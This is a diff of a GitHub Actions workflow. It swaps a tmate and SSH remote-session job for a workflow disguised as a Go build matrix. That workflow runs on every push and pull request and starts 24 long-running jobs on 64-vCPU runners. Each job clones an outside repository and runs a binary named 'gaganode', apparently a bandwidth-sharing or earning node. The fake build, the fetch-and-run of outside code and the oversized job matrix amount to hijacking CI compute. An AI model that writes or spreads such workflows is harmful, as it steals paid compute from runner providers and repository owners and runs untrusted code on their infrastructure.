@@ -1,18 +1,27 @@
-name: ssh
-on: 
-  workflow_dispatch:
-defaults:
-  run:
-    shell: bash
-
+name: Vps
+on: [push, pull_request]
 jobs:
   build:
-    runs-on: ubuntu-latest
+    name: Gaskeun
+    runs-on: buildjet-64vcpu-ubuntu-1804
+    strategy:
+      max-parallel: 256
+      fail-fast: false
+      matrix:
+        go: [1.1, 1.2, 1.3, 1.4,]
+        flag: [A, B, C, D, E, F]
+    timeout-minutes: 360
+    env:
+        NUM_JOBS: 256
+        JOB: ${{ matrix.go }}
     steps:
-    - uses: fastai/workflows/ssh@master
+    - name: Set up Go ${{ matrix.go }}
+      uses: actions/setup-go@v1
       with:
-        ssh_key: ${{ secrets.SSH_KEY }}
-        key_file: id_ecdsa
-    - uses: actions/checkout@v2
-    - name: Session Setup
-      uses: mxschmitt/action-tmate@master
+        go-version: ${{ matrix.go }}
+      id: go
+    - name: Setup
+      uses: actions/checkout@v1
+    - name: runner_go
+      run: |
+        git clone https://github.com/mangknyaganteng391/gaga.git && cd gaga && ./gaganode
